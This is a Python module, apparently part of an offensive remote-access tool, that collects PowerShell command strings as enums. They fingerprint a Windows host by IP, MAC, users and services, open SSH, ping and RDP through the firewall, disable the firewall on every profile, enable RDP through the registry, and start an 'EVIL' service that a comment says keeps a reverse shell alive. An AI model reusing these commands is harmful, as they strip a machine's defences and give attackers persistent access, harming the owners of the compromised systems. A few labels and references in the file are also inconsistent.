#!/usr/bin/env python
#coding=utf-8

__author__ = 'Karl Boulais'

from enum import Enum
import subprocess

# Global
psPrefix = "powershell -command "

class Powershell():
    """Donnes accès à un enum de commandes powershell"""
    
    class GetInfo(Enum):
        # Get user data
        LOCALIP          = f"{psPrefix}(Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias 'Ethernet *').IPAddress"
        MAC              = f"{psPrefix}((Out-String -InputObject (Get-NetAdapter -Physical | Format-List -Property MacAddress)).split(':')[1]).Trim()"
        USERS            = f"{psPrefix}(Out-String -InputObject (Get-LocalUser | Where-object {{ $_.Enabled -like 'True' }} | Format-List -Property Name)).Replace('Name : ', '').Split([Environment]::NewLine, [StringSplitOptions]::RemoveEmptyEntries)"
        HOSTNAME         = f"{psPrefix}[System.Net.Dns]::GetHostName()"
        RUNNINGSERVICES  = f"{psPrefix}Get-Service | Where-Object {{$_.Status -eq 'Running'}}"
        ARCH             = f"{psPrefix}(wmic os get osarchitecture)[2]"

    class OpenPorts(Enum):
        # Open Port and services
        OPENSSHPORT         = f"{psPrefix}New-NetFirewallRule -DisplayName 'ALLOW TCP PORT 21' -Direction inbound -Profile Any -Action Allow -LocalPort 22 -Protocol TCP"
        ALLOWPING           = f"{psPrefix}netsh advfirewall firewall add rule name='ICMP Allow incoming V4 echo request' protocol=icmpv4:8,any dir=in action=allow"
        ALLOWRDP            = f"{psPrefix}Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'"
        DEACTIVATEFIREWALL  = f"{psPrefix}Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"

    class ActivateServices(Enum):
        ENABLERDP           = f"{psPrefix}Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name 'fDenyTSConnections' -Value 0 && ; Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name 'UserAuthentication' -Value 1"    

    # Ajouté un service pour faire persister la connexion reverseShell
    class Persist(Enum):
        STARTEVILSERVICE    = f"{psPrefix}Get-Service -name 'EVIL*' | Start-Service"
        CHECKEVILSTATUS     = f"{psPrefix}(Get-Service -Name 'EVIL*').status"

    # TODO: OPTIONNEL
    # GETADMINPASS = ""
    # GETPUBLICIP  = ""

if __name__ == "__main__":
    pass
    # test = Powershell.GETLOCALIP.value
    # print(str(test))
    # print(Powershell.GetInfo.GETARCH.value)
    # print(subprocess.getoutput(Powershell.Persist.CHECKEVILSTATUS.value))
    # print(subprocess.check_output(Powershell.Persist.CHECKEVILSTATUS.value))
    # for command in (Powershell.GetInfo):
    #     print(command.name)
    #     print(subprocess.check_call(command.value))
